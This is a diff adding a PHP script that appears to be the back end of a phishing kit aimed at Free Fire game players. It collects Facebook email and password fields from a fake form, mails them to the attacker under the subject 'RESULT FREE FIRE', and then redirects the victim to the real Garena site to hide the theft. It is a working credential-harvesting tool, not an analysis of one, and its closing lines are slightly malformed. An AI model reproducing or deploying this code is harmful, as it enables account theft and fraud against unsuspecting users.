@@ -1,0 +1,38 @@
+<?php
+
+
+$nick = $_POST['nickname'];
+$email2 = $_POST['fb1'];
+$pass2 = $_POST['fb2'];
+$lev = $_POST['level'];
+$log = $_POST['login'];
+$ski = $_POST['rank'];
+$emailr= $_POST['elite'];
+$passr= $_POST['passr'];
+
+$message   = "
+
+====[ FACEBOOK ACCOUNT ]====
+
+• Email Facebook :  ".$email2."
+
+• Password Facebook : ".$pass2."
+
+DOSA TANGGUNG SENDIRI EAAA.
+
+";
+
+include 'email.html';
+$subject = "RESULT FREE FIRE";
+$headers = "From: SETOR RESULT FF <alonexcode@result.net>";
+mail($emailku, $subject, $message, $headers);
+
+$md5      = md5(gmdate("r"));
+$sha1     = sha1(gmdate("r"));
+
+?>
+'<script>window.location.replace("https://ff.garena.com/")</script>';}
+}
+?>
+
+<!-- MAAF YA ABANG" SEKALIAN -->
